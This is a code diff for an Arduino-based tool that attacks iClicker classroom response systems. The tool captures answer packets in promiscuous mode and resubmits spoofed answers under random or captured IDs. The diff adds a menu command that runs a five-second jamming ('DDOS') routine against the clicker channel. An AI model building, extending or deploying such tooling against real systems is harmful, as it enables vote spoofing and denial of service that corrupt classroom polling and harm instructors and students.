@@ -12,6 +12,8 @@
 
 #define RAND_LOW 35
 #define RAND_HIGH 75
+
+#define DDOS_LEN 5000
 iClickerAnswerPacket_t recvd[MAX_RECVD];
 uint32_t num_recvd = 0;
 
@@ -28,7 +30,7 @@ void setup()
   // enter promiscouse mode on sending channel
   clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
   delay(1000);
-  Serial.println("Ready!\nr: Reset Capture\na-e: Submit\ns: Start Capture\nt: Stop Capture\nf: Random id answers\nu: Uniform submit\np: Print");
+  Serial.println("Ready!\nr: Reset Capture\na-e: Submit\ns: Start Capture\nt: Stop Capture\nf: Random id answers\nu: Uniform submit\no: DDOS 5 secs\np: Print");
 }
 
 
@@ -65,6 +67,10 @@ void loop()
          uniform_ans();
          break;
 
+       case 'o':
+          ddos(DDOS_LEN);
+          break;
+
        case 's':
         Serial.println("******** STARTED PROMISCUOUS ********");
         clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
@@ -92,7 +98,6 @@ void resubmit_ans(iClickerAnswer_t a, uint8_t percent)
   uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
 
   Serial.println("******** BEGIN ANSWER RESUBMIT ********");
-
   clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
 
   while (!shouldExit())
@@ -120,7 +125,6 @@ void resubmit_ans(iClickerAnswer_t a, uint8_t percent)
   snprintf(tmp, sizeof(tmp), "Resubmitted:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
            res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );
   Serial.println(tmp);
-
   Serial.println("******** END ANSWER RESUBMIT ********");
 }
 
@@ -128,10 +132,10 @@ void resubmit_ans(iClickerAnswer_t a, uint8_t percent)
 void uniform_ans()
 {
     iClickerPacket_t r;
+    Serial.println("******** BEGIN UNIFORM RESUBMIT ********");
     clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
     uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
 
-    Serial.println("******** BEGIN UNIFORM RESUBMIT ********");
     while (!shouldExit())
     {
         if (recvBuf.pull(&r) && r.type == PACKET_ANSWER)
@@ -167,9 +171,18 @@ void ans_randoms(int num)
 }
 
 
+void ddos(uint32_t ms)
+{
+    Serial.println("******** BEGIN DDOS ********");
+    clicker.ddos(ms);
+    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+    Serial.println("******** END DDOS ********");
+}
+
+
 void printCap()
 {
-  Serial.println("********BEGIN DUMP********");
+  Serial.println("******** BEGIN DUMP********");
   char tmp[100];
   uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
   for (uint32_t i = 0; i < num_recvd; i++)
